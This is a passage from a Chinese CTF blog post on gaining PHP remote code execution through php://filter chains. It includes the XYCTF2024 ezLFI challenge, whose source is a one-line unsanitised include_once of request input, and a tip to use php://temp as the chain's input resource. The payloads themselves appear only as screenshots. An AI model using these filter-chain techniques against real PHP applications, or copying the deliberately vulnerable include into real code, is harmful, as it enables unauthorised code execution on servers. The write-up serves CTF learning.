+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519143942700.png" alt="image-20250519143942700"></p>
+<p>参数</p>
+<ul>
+<li>chain：你想注入的PHP链</li>
+<li>rawbase 64：将base64放在最后一次解码之前，这在调试PHP过滤器链时很有用！</li>
+</ul>
+<p>例如拿XYCTF2024的ezLFI的题目说一下</p>
+<h2 id="XYCTF2024-ezLFI"><a href="#XYCTF2024-ezLFI" class="headerlink" title="XYCTF2024-ezLFI"></a>XYCTF2024-ezLFI</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include_once</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>这里也是有文件包含的函数，直接用脚本生成filter链</p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519144612520.png" alt="image-20250519144612520"></p>
+<p>然后我们看看这个链子生成的结果是什么</p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519144707260.png" alt="image-20250519144707260"></p>
+<p>发现代码成功生成并前置了</p>
+<p>传进参数中发现成功进行RCE</p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519144801375.png" alt="image-20250519144801375"></p>
+<p>额外补充一个问题，就是需要有效文件的问题</p>
+<h2 id="php-temp解决有效文件的问题"><a href="#php-temp解决有效文件的问题" class="headerlink" title="php:&#x2F;&#x2F;temp解决有效文件的问题"></a>php:&#x2F;&#x2F;temp解决有效文件的问题</h2><p>这个技巧的一个主要问题就是需要一个有效的文件路径，当然，我们可以用已知的&#x2F;etc&#x2F;passwd，但是因为PHP包装器允许一个嵌套到另一个，所以我们可以通过使用PHP包装器php：&#x2F;&#x2F;temp作为整个过滤器链的输入资源，不再需要猜测目标文件系统上的有效路径，这取决于操作系统。</p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250519145803624.png" alt="image-20250519145803624"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/opt/php_filter_chain_RCE/php_filter_chain_generator# php -r &quot;echo require(&#x27;php://filter/convert.base64-decode/resource=php://temp&#x27;);&quot;&quot;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>至此浅浅的部分就结束了，后面就是深挖从一个编码转向另一个编码的技巧了，这个后面再学吧</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EPHP%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">关于PHP过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFphp-filter"><span class="toc-number">1.1.</span> <span class="toc-text">什么是php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">转换过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#convert-iconv"><span class="toc-number">1.2.1.</span> <span class="toc-text">convert.iconv.*</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64decode%E7%9A%84%E5%9E%83%E5%9C%BE%E5%A4%84%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">base64decode的垃圾处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%BA%8F%E5%88%97%E6%A0%87%E5%BF%97"><span class="toc-number">3.</span> <span class="toc-text">字符序列标志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6"><span class="toc-number">4.</span> <span class="toc-text">构造字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E8%84%9A%E6%9C%AC"><span class="toc-number">5.</span> <span class="toc-text">完整脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%B3%E5%AE%9A%E7%9A%84%E8%BF%87%E6%BB%A4%E5%99%A8%E9%93%BE%E7%94%9F%E6%88%90"><span class="toc-number">6.</span> <span class="toc-text">稳定的过滤器链生成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XYCTF2024-ezLFI"><span class="toc-number">7.</span> <span class="toc-text">XYCTF2024-ezLFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-temp%E8%A7%A3%E5%86%B3%E6%9C%89%E6%95%88%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">8.</span> <span class="toc-text">php:&#x2F;&#x2F;temp解决有效文件的问题</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&text=filters-chain实现RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&title=filters-chain实现RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&is_video=false&description=filters-chain实现RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=filters-chain实现RCE&body=Check out this article: https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&title=filters-chain实现RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&title=filters-chain实现RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&title=filters-chain实现RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&title=filters-chain实现RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&name=filters-chain实现RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/&t=filters-chain实现RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
